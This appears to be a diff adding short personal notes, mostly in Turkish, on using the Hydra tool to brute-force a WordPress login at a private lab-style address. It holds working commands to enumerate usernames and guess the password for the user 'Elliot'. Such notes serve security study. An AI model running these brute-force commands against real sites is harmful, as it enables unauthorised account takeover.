@@ -1,0 +1,11 @@
+HYDRA
+Purpose: Sifre kırma ve parola tahmini için kullanılan çok yönlü bir araç.
+
+Usage  :
+Find True Username:
+hyrda -verboz <wordlist> <orneksifre> <ip adresi> <get/post?> <site uzantisi> <^Bulunmasi istenen^>	   <alinan hata>
+hydra -V -L wordl.txt -p sifretest 10.0.2.7 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
+
+
+Find True Password:
+hydra -V -l Elliot -P wordl.txt 10.0.2.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect"
